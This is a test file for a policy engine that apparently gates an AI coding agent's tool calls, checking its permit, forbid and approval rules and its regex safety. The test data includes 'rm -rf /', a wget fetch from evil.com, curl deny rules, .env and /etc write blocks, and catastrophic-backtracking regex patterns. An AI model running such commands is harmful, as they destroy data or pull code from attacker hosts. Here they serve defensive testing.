import { describe, expect, test } from "bun:test";
import { compilePolicy, DEFAULT_POLICY_SOURCE } from "../../src/core/policy.ts";
import type { CompiledPolicy, SessionID } from "../../src/types.ts";

function compile(raw: unknown): CompiledPolicy {
  const r = compilePolicy(raw);
  if (!r.ok) throw new Error(r.error);
  return r.policy;
}

function evaluate(policy: CompiledPolicy, tool: string, args: Record<string, unknown> = {}) {
  return policy.evaluate({ sessionId: "s" as SessionID, callId: "c", tool, args });
}

const ir = (statements: unknown[], decision = "deny") => ({
  schemaVersion: "armor.policy.v1",
  kind: "PolicyProfile",
  metadata: { name: "t" },
  defaults: { decision },
  statements,
});

describe("compilePolicy", () => {
  test("the default policy permits every tool and requires an intent plan", () => {
    const policy = compile(DEFAULT_POLICY_SOURCE);
    expect(evaluate(policy, "bash", { command: "rm -rf /" })).toEqual({ effect: "permit", ruleId: "allow-all", reason: "" });
    expect(policy.intentRequired).toBe(true);
  });

  test("intentRequired can be turned off at the top level or inside a wrapped policy", () => {
    expect(compile({ ...ir([]), intentRequired: false }).intentRequired).toBe(false);
    expect(compile({ version: 3, policy: ir([]), intentRequired: false }).intentRequired).toBe(false);
    expect(compilePolicy({ ...ir([]), intentRequired: "no" })).toEqual({ ok: false, error: "intentRequired must be a boolean" });
  });

  test("reads ArmorClaude's policy state file shape", () => {
    const policy = compile({ version: 2, updatedAt: "x", policy: ir([{ id: "no-bash", effect: "forbid", action: { type: "tool", eq: "Bash" } }], "allow") });
    expect(evaluate(policy, "bash").effect).toBe("forbid");
    expect(evaluate(policy, "read").effect).toBe("permit");
  });

  test("rejects what it cannot evaluate safely", () => {
    expect(compilePolicy("nope")).toEqual({ ok: false, error: "policy must be a JSON object" });
    expect(compilePolicy({ schemaVersion: "armor.policy.v2" })).toEqual({
      ok: false,
      error: "unsupported schemaVersion armor.policy.v2; expected armor.policy.v1",
    });
    expect(compilePolicy({ rules: "deny all" })).toEqual({ ok: false, error: "rules must be an array" });
    expect(
      compilePolicy(ir([{ id: "bad", effect: "forbid", action: { type: "tool", eq: "Bash" }, conditions: [{ field: "bash.raw", op: "matches", value: "(a)\\1" }] }])),
    ).toEqual({
      ok: false,
      error: "statement bad condition 0: invalid pattern /(a)\\1/: backreferences are not supported in policy patterns",
    });
  });

  test("identical policies hash identically and any statement change changes the hash", () => {
    const a = compile(ir([{ id: "x", effect: "forbid", action: { type: "tool", eq: "Bash" } }]));
    const b = compile(ir([{ id: "x", effect: "forbid", action: { type: "tool", eq: "Bash" } }]));
    const c = compile(ir([{ id: "x", effect: "forbid", action: { type: "tool", eq: "Write" } }]));
    expect(a.hash).toBe(b.hash);
    expect(a.hash).not.toBe(c.hash);
    expect(a.hash).toMatch(/^[0-9a-f]{64}$/);
  });
});

describe("evaluate", () => {
  test("forbid beats require_approval beats permit regardless of order", () => {
    const policy = compile(
      ir([
        { id: "ok", effect: "permit", action: { type: "tool", eq: "*" } },
        { id: "ask", effect: "require_approval", action: { type: "tool", eq: "Bash" } },
        { id: "no", effect: "forbid", action: { type: "tool", eq: "Bash" }, conditions: [{ field: "bash.program", op: "eq", value: "rm" }] },
      ]),
    );
    expect(evaluate(policy, "bash", { command: "rm x" })).toMatchObject({ effect: "forbid", ruleId: "no" });
    expect(evaluate(policy, "bash", { command: "ls" })).toMatchObject({ effect: "require_approval", ruleId: "ask" });
    expect(evaluate(policy, "read", { filePath: "/x" })).toMatchObject({ effect: "permit", ruleId: "ok" });
  });

  test("defaults apply when nothing matches", () => {
    expect(evaluate(compile(ir([], "deny")), "bash")).toMatchObject({ effect: "forbid", ruleId: null });
    expect(evaluate(compile(ir([], "hold")), "bash")).toMatchObject({ effect: "require_approval", ruleId: "default-hold" });
    expect(evaluate(compile(ir([], "allow")), "bash")).toMatchObject({ effect: "permit", ruleId: null });
  });

  test("ArmorClaude tool names select the OpenCode tool they mean", () => {
    const policy = compile(
      ir(
        [
          { id: "no-multiedit", effect: "forbid", action: { type: "tool", eq: "MultiEdit" } },
          { id: "no-agent", effect: "forbid", action: { type: "tool", eq: "Agent" } },
          { id: "no-gh-create", effect: "forbid", action: { type: "tool", eq: "mcp__github__create_issue" } },
          { id: "no-webfetch", effect: "forbid", action: { type: "tool", eq: "WebFetch" } },
        ],
        "allow",
      ),
    );
    expect(evaluate(policy, "edit").ruleId).toBe("no-multiedit");
    expect(evaluate(policy, "task").ruleId).toBe("no-agent");
    expect(evaluate(policy, "github_create_issue").ruleId).toBe("no-gh-create");
    expect(evaluate(policy, "webfetch").ruleId).toBe("no-webfetch");
    expect(evaluate(policy, "github_list_issues").effect).toBe("permit");
  });

  test("mcp.server matches OpenCode names by sanitized prefix, including servers with underscores", () => {
    const policy = compile(
      ir(
        [
          { id: "no-my-db", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "mcp.server", op: "eq", value: "my_db" }] },
          { id: "dashed", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "mcp.server", op: "in", value: ["my.svc"] }] },
        ],
        "allow",
      ),
    );
    expect(evaluate(policy, "my_db_query").ruleId).toBe("no-my-db");
    expect(evaluate(policy, "my_svc_call").ruleId).toBe("dashed");
    expect(evaluate(policy, "my_other_tool").effect).toBe("permit");
    expect(evaluate(policy, "bash").effect).toBe("permit");
  });

  test("a legacy rule naming grep means OpenCode's grep tool, not the shell program", () => {
    const policy = compile({ rules: [{ id: "no-grep", action: "deny", tool: "grep" }, { id: "no-curl", action: "deny", tool: "curl" }] });
    expect(evaluate(policy, "grep", { pattern: "x" }).ruleId).toBe("no-grep");
    expect(evaluate(policy, "bash", { command: "grep x file" }).effect).toBe("permit");
    expect(evaluate(policy, "bash", { command: "curl https://x" }).ruleId).toBe("no-curl");
  });

  test("file.path reads OpenCode's filePath argument", () => {
    const policy = compile(
      ir([{ id: "etc", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "file.path", op: "starts_with", value: "/etc/" }] }], "allow"),
    );
    expect(evaluate(policy, "write", { filePath: "/etc/hosts", content: "x" }).ruleId).toBe("etc");
    expect(evaluate(policy, "write", { filePath: "/tmp/hosts", content: "/etc/hosts" }).effect).toBe("permit");
  });

  test("network.host reads webfetch urls and the first url in a shell command", () => {
    const policy = compile(
      ir([{ id: "evil", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "network.host", op: "eq", value: "evil.com" }] }], "allow"),
    );
    expect(evaluate(policy, "webfetch", { url: "https://evil.com/a" }).ruleId).toBe("evil");
    expect(evaluate(policy, "bash", { command: "wget -q https://evil.com/x -O-" }).ruleId).toBe("evil");
    expect(evaluate(policy, "webfetch", { url: "not a url" }).effect).toBe("permit");
  });

  test("rules on Write and Edit reach apply_patch, evaluated per file in the patch", () => {
    const policy = compile(
      ir(
        [
          { id: "no-env", effect: "forbid", action: { type: "tool", in: ["Write", "Edit", "MultiEdit"] }, conditions: [{ field: "file.path", op: "matches", value: "\\.env$" }] },
          { id: "etc", effect: "require_approval", action: { type: "tool", eq: "Edit" }, conditions: [{ field: "file.path", op: "starts_with", value: "/etc/" }] },
          { id: "edits", effect: "permit", action: { type: "tool", eq: "Write" } },
        ],
        "deny",
      ),
    );
    const patch = (...headers: string[]) => ({ patchText: ["*** Begin Patch", ...headers, "*** End Patch"].join("\n") });
    expect(evaluate(policy, "apply_patch", patch("*** Add File: src/a.ts", "+x"))).toMatchObject({ effect: "permit", ruleId: "edits" });
    expect(evaluate(policy, "apply_patch", patch("*** Add File: src/a.ts", "+x", "*** Add File:.env", "+K=1"))).toMatchObject({ effect: "forbid", ruleId: "no-env" });
    expect(evaluate(policy, "apply_patch", patch("*** Update File: /etc/hosts", "@@", "*** Add File: b.ts"))).toMatchObject({ effect: "require_approval", ruleId: "etc" });
  });

  test("tool.name conditions accept ArmorClaude and OpenCode spellings", () => {
    const policy = compile(
      ir(
        [
          { id: "eq", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "tool.name", op: "eq", value: "Bash" }] },
          { id: "re", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "tool.name", op: "matches", value: "^(Write|Edit)$" }] },
          { id: "not", effect: "require_approval", action: { type: "tool", eq: "*" }, conditions: [{ field: "tool.name", op: "not_in", value: ["Read", "grep", "Bash", "Write", "Edit"] }] },
        ],
        "allow",
      ),
    );
    expect(evaluate(policy, "bash").ruleId).toBe("eq");
    expect(evaluate(policy, "write").ruleId).toBe("re");
    expect(evaluate(policy, "read").effect).toBe("permit");
    expect(evaluate(policy, "grep").effect).toBe("permit");
    expect(evaluate(policy, "webfetch").ruleId).toBe("not");
  });

  test("mcp.server patterns consider every possible server prefix", () => {
    const policy = compile(
      ir(
        [
          { id: "re", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "mcp.server", op: "matches", value: "^my_srv$" }] },
          { id: "prefix", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "mcp.server", op: "starts_with", value: "prod_" }] },
          { id: "gh", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "mcp.server", op: "eq", value: "gh" }] },
        ],
        "allow",
      ),
    );
    expect(evaluate(policy, "my_srv_drop_table").ruleId).toBe("re");
    expect(evaluate(policy, "prod_db_query").ruleId).toBe("prefix");
    expect(evaluate(policy, "gh_get__x").ruleId).toBe("gh");
    expect(evaluate(policy, "gh__priv").ruleId).toBe("gh");
    expect(evaluate(policy, "dev_db_query").effect).toBe("permit");
  });

  test("an unknown condition field or op is a compile error, not a dropped condition", () => {
    const withCondition = (condition: unknown) =>
      compilePolicy(ir([{ id: "p", effect: "permit", action: { type: "tool", eq: "Bash" }, conditions: [condition] }]));
    expect(withCondition({ field: "bash.command", op: "eq", value: "ls" })).toEqual({
      ok: false,
      error: 'statement p: unknown condition field "bash.command"',
    });
    expect(withCondition({ field: "bash.raw", op: "contains", value: "ls" })).toEqual({
      ok: false,
      error: 'statement p: unknown condition op "contains"',
    });
  });

  test("a 1 MB write argument evaluates in under 2 ms against a pattern rule", () => {
    const policy = compile(
      ir(
        [
          { id: "rmrf", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "bash.raw", op: "matches", value: ".*rm\\s+-rf" }] },
          { id: "env", effect: "forbid", action: { type: "tool", eq: "*" }, conditions: [{ field: "file.path", op: "matches", value: "\\.env$" }] },
        ],
        "allow",
      ),
    );
    const content = "rm -rf / ".repeat(120_000);
    evaluate(policy, "write", { filePath: "/w/a.txt", content });
    const t = performance.now();
    const v = evaluate(policy, "write", { filePath: "/w/a.txt", content });
    const ms = performance.now() - t;
    expect(v.effect).toBe("permit");
    expect(ms).toBeLessThan(2);
  });

  test("a 29-character backtracking attack against accepted patterns is fast", () => {
    const patterns = ["^(a+)+$", "^(a|a)*$", "^(a|aa)+$", "(.*a){12}", "^(\\w+\\s?)+$"];
    const policy = compile(
      ir(
        patterns.map((value, i) => ({
          id: `p${i}`,
          effect: "forbid",
          action: { type: "tool", eq: "Bash" },
          conditions: [{ field: "bash.raw", op: "matches", value }],
        })),
        "allow",
      ),
    );
    const t = performance.now();
    expect(evaluate(policy, "bash", { command: `${"a".repeat(29)}!` }).effect).toBe("forbid");
    expect(performance.now() - t).toBeLessThan(10);
  });
});
